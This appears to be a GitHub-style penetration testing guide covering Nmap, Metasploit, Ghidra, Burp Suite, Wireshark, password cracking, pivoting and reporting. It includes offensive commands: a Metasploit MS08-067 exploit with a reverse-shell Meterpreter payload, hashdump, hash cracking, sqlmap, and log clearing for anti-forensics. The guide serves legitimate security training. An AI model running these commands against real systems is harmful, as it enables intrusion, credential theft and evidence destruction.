
# **Penetration Testing: Practical Guide & Tools Overview**

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/d97bce4b-6c57-4897-ac8c-f697b9124450" />

## **1. Introduction to Penetration Testing**

Penetration testing (pentesting) is a cybersecurity technique used to identify, test, and remediate vulnerabilities in systems, networks, and applications. It simulates real-world attacks to evaluate the security posture of an organization. The key phases of a pentest include:
- **Reconnaissance**: Gathering information about the target.
- **Scanning**: Identifying open ports, services, and vulnerabilities.
- **Exploitation**: Gaining access by exploiting vulnerabilities.
- **Post-Exploitation**: Maintaining access, pivoting, and data extraction.
- **Reporting**: Documenting findings and recommendations.

**This guide covers essential tools, commands, and techniques for each phase.**

---

## **2. Essential Tools and Their Usage**

### **2.1 Nmap (Network Mapper)**
Nmap is a free, open-source tool for network discovery and security auditing. It is used to discover hosts, services, open ports, and vulnerabilities on a network .

#### **Key Features and Commands**:
- **Host Discovery**:
  - `nmap -sn <target>`: Performs a ping scan to detect live hosts.
  - `nmap -PR <target>`: ARP ping scan for local networks.
  - `nmap -PE <target>`: ICMP echo ping scan.
  - `nmap -PO <target>`: IP protocol ping scan.

- **Port Scanning**:
  - `nmap -sS <target>`: TCP SYN scan (stealth scan).
  - `nmap -sT <target>`: TCP connect scan.
  - `nmap -sU <target>`: UDP scan.
  - `nmap -p <port_range> <target>`: Scan specific ports (e.g., `-p 22,80,443`).

- **Service and OS Detection**:
  - `nmap -sV <target>`: Detect service versions.
  - `nmap -O <target>`: OS detection.
  - `nmap -A <target>`: Aggressive scan (enables OS detection, version detection, and script scanning).

- **Advanced Scanning**:
  - `nmap --script vuln <target>`: Scan for vulnerabilities using NSE scripts.
  - `nmap -sC <target>`: Run default scripts.

#### **Practical Example**:
```bash
# Comprehensive scan with OS detection, service version, and default scripts
nmap -A -T4 192.168.1.0/24

# Stealth SYN scan with specific ports
nmap -sS -p 22,80,443,8080 192.168.1.10

# UDP scan for common ports
nmap -sU -p 53,67,68,161 192.168.1.10
```

#### **Tips**:
- Use `-T4` for faster scans on reliable networks.
- Combine multiple host discovery techniques (`-PE -PP -PS80,443`) to bypass filters.
- Output results to files using `-oA <filename>` for later analysis .

---

### **2.2 Metasploit Framework**
Metasploit is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities. It includes a vast database of exploits, payloads, and auxiliary modules .

#### **Key Components**:
- **Modules**:
  - **Exploits**: Code that exploits a vulnerability (e.g., `exploit/windows/smb/ms08_067_netapi`).
  - **Payloads**: Code executed after exploitation (e.g., `windows/meterpreter/reverse_tcp`).
  - **Auxiliary**: Scanning, fuzzing, and admin modules (e.g., `auxiliary/scanner/smb/smb_version`).
  - **Post**: Post-exploitation modules (e.g., `post/windows/gather/hashdump`).

- **Database Integration**: Metasploit can integrate with PostgreSQL to store scan results and host data .

#### **Basic Commands**:
```bash
# Start Metasploit console
msfconsole

# Search for modules
search type:exploit platform:windows term:smb

# Use a module
use exploit/windows/smb/ms08_067_netapi

# Set module options
set RHOSTS 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5

# Run the exploit
exploit

# Post-exploitation commands (Meterpreter)
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > shell
```

#### **Practical Example**:
```bash
# Example: Exploiting a vulnerable SMB service
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(ms08_067_netapi) > set RHOSTS 192.168.1.10
msf6 exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(ms08_067_netapi) > set LHOST 192.168.1.5
msf6 exploit(ms08_067_netapi) > exploit

# After gaining access, escalate privileges and dump hashes
meterpreter > getsystem
meterpreter > hashdump
```

#### **Tips**:
- Use `check` to verify if a target is vulnerable without exploiting it .
- Leverage Meterpreter for post-exploitation tasks like keylogging, screenshots, and pivoting.
- Use `db_nmap` to integrate Nmap scans into Metasploit's database .

---

### **2.3 Ghidra**
Ghidra is a reverse engineering tool developed by the NSA. It is used for analyzing malicious code, firmware, and vulnerabilities in software .

#### **Key Features**:
- **Disassembly and Decompilation**: Converts binary code into assembly and high-level C-like code.
- **Scripting**: Supports Python and Java scripts for automation.
- **Collaboration**: Allows multiple users to work on the same project.

#### **Basic Workflow**:
1. **Create a Project**: Import a binary file.
2. **Analyze**: Ghidra automatically analyzes the code.
3. **Disassemble**: View the assembly code in the Listing window.
4. **Decompile**: View the decompiled code in the Decompiler window.
5. **Annotate**: Rename variables, add comments, and define data structures.

#### **Practical Example**:
- **Identifying Vulnerabilities**:
  - Use the decompiler to identify insecure functions like `strcpy` or `printf`.
  - Trace user input to identify buffer overflow vulnerabilities.

#### **Tips**:
- Use the **Function Graph** to visualize control flow.
- Leverage **Version Tracking** to compare different versions of a binary.
- Use **Script Manager** to run automated analysis scripts.

---

### **2.4 Burp Suite**
Burp Suite is a web application security testing tool. It includes a proxy, scanner, and various other tools for testing web apps .

#### **Key Components**:
- **Proxy**: Intercept and modify HTTP/S requests.
- **Scanner**: Automated vulnerability scanner.
- **Intruder**: Tool for brute-force attacks and fuzzing.
- **Repeater**: Manipulate and resend requests.

#### **Basic Usage**:
1. **Configure Browser Proxy**: Set proxy to `127.0.0.1:8080`.
2. **Intercept Requests**: Enable interception in Burp Proxy.
3. **Scan for Vulnerabilities**: Use Burp Scanner to identify issues like SQLi, XSS, etc.
4. **Exploit**: Use Intruder for brute-force attacks.

#### **Practical Example**:
- **Brute-Force Login**:
  - Intercept a login request.
  - Send to Intruder.
  - Set payload positions for username and password.
  - Use a wordlist (e.g., `rockyou.txt`) to perform the attack.

#### **Tips**:
- Use **Burp Extensions** to add functionality.
- **Save Project** to resume work later.

---

### **2.5 Wireshark**
Wireshark is a network protocol analyzer. It captures and inspects network traffic in real-time .

#### **Key Features**:
- **Deep Inspection**: Detailed analysis of hundreds of protocols.
- **Live Capture**: Capture from network interfaces.
- **Filtering**: Use display filters (e.g., `http`, `tcp.port == 443`) to focus on specific traffic.

#### **Basic Commands**:
- **Start Capture**: Select interface and click "Start".
- **Apply Filters**: Use the filter bar to apply filters (e.g., `ip.src == 192.168.1.10`).
- **Follow TCP Stream**: Right-click on a packet and select "Follow TCP Stream" to reconstruct sessions.

#### **Practical Example**:
- **Identifying Malicious Traffic**:
  - Filter for `http.request.method == POST` to inspect form submissions.
  - Look for unusual patterns or data exfiltration.

#### **Tips**:
- Use **Statistics** tools to identify top talkers and protocols.
- **Export Objects** to extract files from HTTP traffic.

---

## **3. Penetration Testing Techniques**

### **3.1 Reconnaissance**
- **Passive Recon**: Gather information without directly interacting with the target (e.g., WHOIS, DNS enumeration).
- **Active Recon**: Direct interaction with the target (e.g., Nmap scans).

#### **Tools**:
- **Nmap**: For network scanning.
- **theHarvester**: For email and subdomain enumeration.
- **Shodan**: Search for vulnerable devices and services.

### **3.2 Vulnerability Assessment**
- **Identify Vulnerabilities**: Use scanners like Nessus, OpenVAS, or Nmap NSE scripts.
- **Prioritize**: Focus on critical vulnerabilities (e.g., CVSS score > 7.0).

#### **Tools**:
- **Nessus**: Comprehensive vulnerability scanner .
- **OpenVAS**: Open-source vulnerability scanner.

### **3.3 Exploitation**
- **Exploit Selection**: Choose exploits based on the target's OS, services, and vulnerabilities.
- **Payload Delivery**: Deliver payloads using Metasploit or custom scripts.

#### **Tools**:
- **Metasploit**: For exploit delivery.
- **Sqlmap**: For SQL injection exploitation.
- **John the Ripper**: For password cracking .

### **3.4 Post-Exploitation**
- **Maintain Access**: Install backdoors or persistency mechanisms.
- **Pivot**: Use compromised hosts to access internal networks.
- **Data Extraction**: Collect sensitive data (e.g., passwords, documents).

#### **Tools**:
- **Meterpreter**: For post-exploitation tasks.
- **Cobalt Strike**: For advanced red team operations.

---

## **4. Practical Examples and Command Cheat Sheets**

### **4.1 Nmap Cheat Sheet**
| **Command** | **Description** |
|-------------|----------------|
| `nmap -sS -p- -A <target>` | Full TCP port scan with OS and version detection |
| `nmap -sU -p 53,161 <target>` | UDP scan for DNS and SNMP |
| `nmap --script vuln <target>` | Scan for vulnerabilities |
| `nmap -iL targets.txt` | Scan targets from a file |

### **4.2 Metasploit Cheat Sheet**
| **Command** | **Description** |
|-------------|----------------|
| `use <module>` | Select a module |
| `set <option> <value>` | Set module options |
| `exploit` | Run the exploit |
| `sessions -l` | List active sessions |
| `sessions -i <id>` | Interact with a session |

### **4.3 Ghidra Hotkeys**
| **Hotkey** | **Description** |
|------------|----------------|
| `F` | Create function |
| `L` | Create label |
| `;` | Add comment |
| `G` | Go to address |

---

## **5. Additional Utilities and Tips**

### **5.1 Password Cracking**
- **John the Ripper**:
  ```bash
  john --format=NT hashes.txt
  john --wordlist=rockyou.txt hashes.txt
  ```
- **Hashcat**:
  ```bash
  hashcat -m 1000 hashes.txt rockyou.txt
  ```

### **5.2 Web Application Testing**
- **Sqlmap**:
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dbs
  ```
- **OWASP ZAP**: Open-source web app scanner .

### **5.3 Network Pivoting**
- **SSH Tunneling**:
  ```bash
  ssh -L 8080:internal_host:80 user@gateway
  ```
- **Meterpreter Pivoting**:
  ```bash
  meterpreter > run autoroute -s 192.168.2.0/24
  meterpreter > background
  msf6 > use auxiliary/scanner/portscan/tcp
  msf6 > set RHOSTS 192.168.2.0/24
  msf6 > run
  ```

### **5.4 Anti-Forensics**
- **Clearing Logs**:
  - Meterpreter: `clearev`
  - Linux: `shred -u file.txt`

---

## **6. Reporting and Documentation**

A penetration test report should include:
- **Executive Summary**: High-level overview of findings.
- **Methodology**: Steps taken during the test.
- **Findings**: Detailed vulnerabilities, including CVSS scores and proof-of-concept.
- **Recommendations**: Remediation steps.
- **Appendices**: Tool outputs, commands used, and references.

#### **Tools for Reporting**:
- **Dradis**: Collaboration and reporting tool.
- **Serpico**: Report generation framework.

---

## **7. Conclusion**

Penetration testing is a critical skill for identifying and mitigating security risks. This guide covers essential tools and techniques for each phase of a pentest. Practice in lab environments, stay updated with the latest vulnerabilities, and always follow ethical guidelines.

---

## **8. Additional Resources**
- **Books**: *The Web Application Hacker's Handbook*, *Metasploit: The Penetration Tester's Guide*.
- **Websites**: [PTES](http://pentest-standard.org/), [OWASP](https://owasp.org/).
- **Courses**: [Hack The Box](https://www.hackthebox.com/), [Offensive Security](https://www.offensive-security.com/).

---

To be continued...
